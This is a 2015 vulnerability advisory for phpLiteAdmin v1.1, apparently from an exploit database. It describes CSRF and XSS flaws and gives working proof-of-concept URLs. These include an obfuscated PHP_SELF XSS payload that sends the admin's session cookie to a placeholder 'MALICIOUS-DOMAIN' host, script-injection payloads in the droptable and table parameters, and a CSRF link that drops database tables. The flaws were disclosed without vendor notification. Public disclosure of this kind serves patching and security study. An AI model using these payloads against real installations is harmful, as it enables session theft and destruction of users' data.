# Google Dork: intitle: CSRF & XSS
# Date: 2015-07-05
# Exploit Author:  John Page ( hyp3rlinx )
# Website: hyp3rlinx.altervista.org
# Vendor Homepage: bitbucket.org/phpliteadmin
# Software Link: bitbucket.org/phpliteadmin
# Version: v1.1
# Tested on: windows 7
# Category: webapps
 
Vendor:
================================
bitbucket.org/phpliteadmin
 
Product:
================================
phpLiteAdmin v1.1
 
Advisory Information:
================================================
CSRF & XSS Vulnerabilities
 
Vulnerability Details:
======================
 
CSRF:
------
No CSRF token exists when making calls to various SQL operations
therefore we can get user to drop the whole database tables if they click
on our malicious link and table is known.
 
XSS:
------
There are three XSS vulnerabilities I point out first is use of &#039;PHP_SELF&#039;,
second is unsanitized parameter
for SQL statement when calling drop table method e.g. &#039;
http://localhost/phpliteadmin.php?droptable=[XSS]&#039;
and third is an unsanitized &#039;table&#039; parameter e.g. &#039;
http://localhost/phpliteadmin_v1-1/phpliteadmin.php?table=[XSS]&#039;
 
Lets look at the first one more in depth as its more fun.
phpliteadmin uses a PHP reserved server variable $_SERVER[&#039;PHP_SELF&#039;] which
is vulnerable if not used correctly
allowing us to inject an XSS payload to steal session cookies and navigate
them to a place of our choosing
in order to cause mayhem.
 
On line 32 of &#039;phpliteadmin.php&#039; we find vulnerable code:
 
--------------------------------------------------------
//build the basename of this file
$nameArr = explode("?", $_SERVER[&#039;PHP_SELF&#039;]);
$thisName = $nameArr[0];
$nameArr = explode("/", $thisName);
$thisName = $nameArr[sizeof($nameArr)-1];
 
//constants
define("VERSION", "1.1");
define("PAGE", $thisName);
-------------------------------------------------------
 
In PHP docs we find the following explanation of &#039;PHP_SELF&#039;:
"The filename of the currently executing script, relative to the document
root."
ref: http://php.net/manual/en/reserved.variables.server.php
 
It is known $_SERVER[&#039;PHP_SELF&#039;] can make your application insecure as we
can inject code following a forward slash "/"
But we have slight problem to overcome, we can execute code but our forward
slashes will not be processed correctly
and exploit will FAIL! leaving us with the following useless URL instead of
taking the victim to a domain of our choice.
 
 
Fail exploit example:
http://localhost/phpliteadmin_v1-1/phpliteadmin.php/
"&#039;onMouseOver="window.open(&#039;http://hyp3rlinx.altervista.org&#039;)"
 
Failed Result:
http://localhost/phpliteadmin_v1-1/phpliteadmin.php/hyp3rlinx.altervista.org
 
 
But all is NOT lost!, we will construct our malicious URL forward slashes
in our JS call to window.open() method using
String.charCodeAt(58) for &#039;:&#039; and String.charCodeAt(47) for &#039;/&#039; which will
NOW give us what we seek, control over the users browser
taking them to some terrible dark place.
 
Bypass $_SERVER[&#039;PHP_SELF&#039;] forward slash &#039;//&#039; processing issue:
 
Tada!, our successful XSS exploit:
http://localhost/phpliteadmin_v1-1/phpliteadmin.php/"&#039;onMouseOver="(function(){var
x=&#039;http&#039;;x+=String.fromCharCode(58)+String.fromCharCode(47)+String.fromCharCode(47)+&#039;
hyp3rlinx.altervista.org&#039;;window.open(x);})()"
 
 
Exploit code(s):
===============
 
XSS(s) POC:
----------
 
 
1- $_SERVER[&#039;PHP_SELF&#039;] XSS exploit steals current admin session cookie and
sends to remote server:
http://localhost/phpliteadmin_v1-1/phpliteadmin.php/"&#039;onMouseOver="(function(){var
x=&#039;http&#039;;x+=String.fromCharCode(58)+String.fromCharCode(47)+String.fromCharCode(47)+&#039;MALICIOUS-DOMAIN&#039;;window.open(x+String.fromCharCode(47)+&#039;cookietheft.php&#039;+String.fromCharCode(63)+&#039;=&#039;+document.cookie);})()"
 
 
2- SQL droptable XSS:
http://localhost/sectest/phpliteadmin_v1-1/phpliteadmin.php?droptable=
<script>alert(666)</script>
 
 
3- SQL table XSS:
http://localhost/phpliteadmin_v1-1/phpliteadmin.php?table=
"/><script>alert(666)</script>
 
 
 
CSRF POC:
---------
Drop tables:
localhost/phpliteadmin_v1-1/phpliteadmin.php?droptable=mytable&confirm=1
 
 
 
Disclosure Timeline:
=========================================================
 
 
Vendor Notification:  NA
July 5, 2015  : Public Disclosure
 
 
 
Severity Level:
=========================================================
Med
 
 
 
Description:
==========================================================
 
 
Request Method(s):              [+] GET
 
 
Vulnerable Product:             [+] phpliteadmin_v1-1
 
 
Vulnerable Parameter(s):        [+] $_SERVER[&#039;PHP_SELF&#039;], droptable, table
 
 
Affected Area(s):               [+] Admin
 
 
===========================================================
 
[+] Disclaimer
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and that due
credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit is given to
the author. The author is not responsible for any misuse of the information
contained herein and prohibits any malicious use of all security related
information or exploits by the author or elsewhere.
 
 
(hyp3rlinx)

